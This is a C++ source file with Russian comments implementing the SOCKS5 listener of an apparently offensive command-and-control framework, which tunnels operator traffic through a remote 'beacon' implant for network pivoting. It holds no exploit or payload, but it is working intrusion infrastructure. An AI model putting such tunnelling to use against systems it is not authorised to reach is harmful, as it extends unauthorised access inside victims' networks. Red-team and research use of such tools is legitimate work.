// Socks5Listener.cpp — серверная часть SOCKS5 over C2.
//
// Принимает SOCKS5-клиентов (proxychains, ncat, curl --socks5 и т.д.),
// выполняет handshake и пересылает трафик через C2-канал бикона.
//
// Поддерживаемые возможности:
//   - Auth: только 0x00 (no-auth)
//   - Команды: только CONNECT (0x01)
//   - Адреса: IPv4 (0x01) и доменное имя (0x03)

#include "Socks5Listener.hpp"
#include "../../Core.hpp"
#include "../../core/TaskQueue.hpp"

#include <co2h/kv.hpp>
#include <co2h/proto.hpp>
#include <spdlog/spdlog.h>

#include <array>
#include <cstdio>
#include <cstring>

namespace co2h::server::socks5 {

using namespace ::co2h::kv;

// ---- Состояния SOCKS5 соединения ----------------------------------------

struct Socks5Listener::SocksConn
    : public std::enable_shared_from_this<SocksConn> {
    enum class State { Auth, Request, Connecting, Connected };

    SocksConn(std::shared_ptr<Socks5Listener> l,
              asio::ip::tcp::socket s,
              std::uint64_t cid)
        : listener(std::move(l)), sock(std::move(s)), conn_id(cid)
    {}

    std::shared_ptr<Socks5Listener> listener;
    asio::ip::tcp::socket           sock;
    std::uint64_t                   conn_id;
    State                           state   = State::Auth;
    Bytes                           rbuf;   // накопленные входящие байты от клиента

    // Начало чтения.
    void start() { do_read(); }

    void do_read() {
        auto self = shared_from_this();
        auto tmp  = std::make_shared<std::array<std::uint8_t, 4096>>();
        sock.async_read_some(asio::buffer(*tmp),
            [this, self, tmp](const std::error_code& ec, std::size_t n) {
                if (ec) { close(); return; }
                rbuf.insert(rbuf.end(), tmp->begin(), tmp->begin() + n);
                process();
            });
    }

    void process() {
        switch (state) {
            case State::Auth:      do_auth();    break;
            case State::Request:   do_request(); break;
            case State::Connecting:
                // Клиент не должен слать данные до ответа на CONNECT.
                // Всё что накопилось — ждём, пока бикон не подтвердит.
                break;
            case State::Connected: do_relay();   break;
        }
    }

    // Фаза 1: согласование метода аутентификации.
    void do_auth() {
        if (rbuf.size() < 2) { do_read(); return; }
        if (rbuf[0] != 0x05) { close(); return; }
        std::uint8_t nmethods = rbuf[1];
        if (rbuf.size() < 2u + nmethods) { do_read(); return; }

        bool no_auth = false;
        for (int i = 0; i < nmethods; ++i)
            if (rbuf[2 + i] == 0x00) { no_auth = true; break; }

        if (!no_auth) {
            // Нет поддерживаемого метода — отказываем.
            std::array<std::uint8_t, 2> resp{0x05, 0xFF};
            auto self = shared_from_this();
            auto buf  = std::make_shared<std::array<std::uint8_t, 2>>(resp);
            asio::async_write(sock, asio::buffer(*buf),
                [self, buf](const std::error_code&, std::size_t) { self->close(); });
            return;
        }
        rbuf.erase(rbuf.begin(), rbuf.begin() + 2 + nmethods);
        state = State::Request;

        std::array<std::uint8_t, 2> resp{0x05, 0x00};
        auto self = shared_from_this();
        auto buf  = std::make_shared<std::array<std::uint8_t, 2>>(resp);
        asio::async_write(sock, asio::buffer(*buf),
            [this, self, buf](const std::error_code& ec, std::size_t) {
                if (ec) { close(); return; }
                process();
            });
    }

    // Фаза 2: разбор CONNECT-запроса.
    void do_request() {
        if (rbuf.size() < 4) { do_read(); return; }
        if (rbuf[0] != 0x05) { close(); return; }
        if (rbuf[1] != 0x01) {
            // Не CONNECT — не поддерживается.
            send_socks_reply(0x07); return;  // 0x07 = command not supported
        }
        // rbuf[2] = RSV, rbuf[3] = addr_type
        std::string host;
        std::uint16_t port = 0;
        std::size_t consumed = 4;

        std::uint8_t atyp = rbuf[3];
        if (atyp == 0x01) {  // IPv4
            if (rbuf.size() < 10) { do_read(); return; }
            char ip[16];
            std::snprintf(ip, sizeof(ip), "%u.%u.%u.%u",
                rbuf[4], rbuf[5], rbuf[6], rbuf[7]);
            host = ip;
            port = (std::uint16_t(rbuf[8]) << 8) | rbuf[9];
            consumed = 10;
        } else if (atyp == 0x03) {  // Domain name
            if (rbuf.size() < 5) { do_read(); return; }
            std::uint8_t len = rbuf[4];
            if (rbuf.size() < 5u + len + 2u) { do_read(); return; }
            host = std::string(reinterpret_cast<const char*>(&rbuf[5]), len);
            port = (std::uint16_t(rbuf[5 + len]) << 8) | rbuf[5 + len + 1];
            consumed = 5u + len + 2u;
        } else {
            send_socks_reply(0x08); return;  // 0x08 = address type not supported
        }

        rbuf.erase(rbuf.begin(), rbuf.begin() + consumed);
        state = State::Connecting;

        // Отправить OP_SOCKS_OPEN бикону.
        Writer w;
        w.put_u64("conn_id", conn_id);
        w.put_str("host",    host);
        w.put_u32("port",    port);
        auto pl = w.finish();
        listener->core_->tasks().enqueue(
            listener->beacon_id(),
            proto::TaskOp::SocksOpen,
            Bytes{pl.begin(), pl.end()}, 0);

        spdlog::debug("socks5 CONNECT conn={} -> {}:{}", conn_id, host, port);
        // Не читаем больше до ответа от бикона.
    }

    // Данные от клиента в состоянии Connected → OP_SOCKS_DATA бикону.
    void do_relay() {
        if (rbuf.empty()) { do_read(); return; }
        Writer w;
        w.put_u64("conn_id", conn_id);
        w.put_bytes("data", {rbuf.data(), rbuf.size()});
        auto pl = w.finish();
        listener->core_->tasks().enqueue(
            listener->beacon_id(),
            proto::TaskOp::SocksData,
            Bytes{pl.begin(), pl.end()}, 0);
        rbuf.clear();
        do_read();
    }

    // Ответ SOCKS5: [5][rep][0][1][0,0,0,0][0,0]
    void send_socks_reply(std::uint8_t rep) {
        static const std::array<std::uint8_t, 10> tmpl = {
            0x05, 0x00, 0x00, 0x01,
            0x00, 0x00, 0x00, 0x00,
            0x00, 0x00
        };
        auto buf = std::make_shared<std::array<std::uint8_t, 10>>(tmpl);
        (*buf)[1] = rep;
        auto self = shared_from_this();
        asio::async_write(sock, asio::buffer(*buf),
            [this, self, buf, rep](const std::error_code& ec, std::size_t) {
                if (ec || rep != 0x00) { close(); return; }
                state = State::Connected;
                // Если клиент уже успел что-то прислать в период Connecting.
                if (!rbuf.empty()) do_relay();
                else do_read();
            });
    }

    // Данные от бикона → запись в клиентский сокет.
    void on_data(BytesView data) {
        if (!sock.is_open()) return;
        auto buf = std::make_shared<Bytes>(data.begin(), data.end());
        auto self = shared_from_this();
        asio::async_write(sock, asio::buffer(*buf),
            [self, buf](const std::error_code&, std::size_t) {});
    }

    void close() {
        if (!sock.is_open()) return;
        std::error_code ec;
        sock.close(ec);
        // Сообщить бикону о закрытии.
        Writer w;
        w.put_u64("conn_id", conn_id);
        auto pl = w.finish();
        listener->core_->tasks().enqueue(
            listener->beacon_id(),
            proto::TaskOp::SocksClose,
            Bytes{pl.begin(), pl.end()}, 0);
        // Убрать из таблицы.
        std::lock_guard lk{listener->mu_};
        listener->conns_.erase(conn_id);
    }
};

// ---- Socks5Listener -------------------------------------------------------

Socks5Listener::Socks5Listener(std::shared_ptr<Core> core,
                               std::string name,
                               std::string bind_host,
                               std::uint16_t bind_port,
                               std::string beacon_id)
    : core_(std::move(core))
    , name_(std::move(name))
    , bind_host_(std::move(bind_host))
    , bind_port_(bind_port)
    , beacon_id_(std::move(beacon_id))
    , acc_(core_->io())
{}

void Socks5Listener::start() {
    asio::ip::tcp::endpoint ep{
        asio::ip::make_address(bind_host_), bind_port_};
    acc_.open(ep.protocol());
    acc_.set_option(asio::ip::tcp::acceptor::reuse_address(true));
    acc_.bind(ep);
    acc_.listen();
    spdlog::info("socks5 listener '{}' on {} beacon={}",
                 name_, bind_addr(), beacon_id_);
    do_accept();
}

void Socks5Listener::stop() {
    std::error_code ec;
    acc_.close(ec);
    std::lock_guard lk{mu_};
    for (auto& [id, conn] : conns_) {
        std::error_code ec2;
        conn->sock.close(ec2);
    }
    conns_.clear();
}

void Socks5Listener::do_accept() {
    auto self = shared_from_this();
    auto sock = std::make_shared<asio::ip::tcp::socket>(core_->io());
    acc_.async_accept(*sock, [this, self, sock](const std::error_code& ec) {
        if (ec) {
            if (ec != asio::error::operation_aborted)
                spdlog::warn("socks5 '{}' accept: {}", name_, ec.message());
            return;
        }
        auto cid  = next_conn_id_.fetch_add(1);
        auto conn = std::make_shared<SocksConn>(self, std::move(*sock), cid);
        {
            std::lock_guard lk{mu_};
            conns_[cid] = conn;
        }
        conn->start();
        do_accept();
    });
}

// Вызывается Core::route_socks_output() на потоке io_context.
// data = [u64 conn_id BE][u8 type][payload]
void Socks5Listener::on_beacon_output(BytesView data) {
    if (data.size() < 9) return;  // минимум 8(conn_id) + 1(type)

    std::uint64_t cid = 0;
    for (int i = 0; i < 8; ++i) cid = (cid << 8) | data[i];
    std::uint8_t type = data[8];
    BytesView payload{data.data() + 9, data.size() - 9};

    std::shared_ptr<SocksConn> conn;
    {
        std::lock_guard lk{mu_};
        auto it = conns_.find(cid);
        if (it == conns_.end()) return;
        conn = it->second;
    }

    switch (type) {
        case 0x01: // CONNECT_OK
            conn->send_socks_reply(0x00);
            break;
        case 0x02: // CONNECT_FAIL
            conn->send_socks_reply(0x05);  // 0x05 = connection refused
            break;
        case 0x03: { // DATA [u32 len BE][bytes]
            if (payload.size() < 4) break;
            std::uint32_t dlen =
                (std::uint32_t(payload[0]) << 24) | (std::uint32_t(payload[1]) << 16) |
                (std::uint32_t(payload[2]) <<  8) |  std::uint32_t(payload[3]);
            if (payload.size() < 4u + dlen) break;
            conn->on_data({payload.data() + 4, dlen});
            break;
        }
        case 0x04: // CLOSE
            conn->close();
            break;
        default:
            break;
    }
}

}
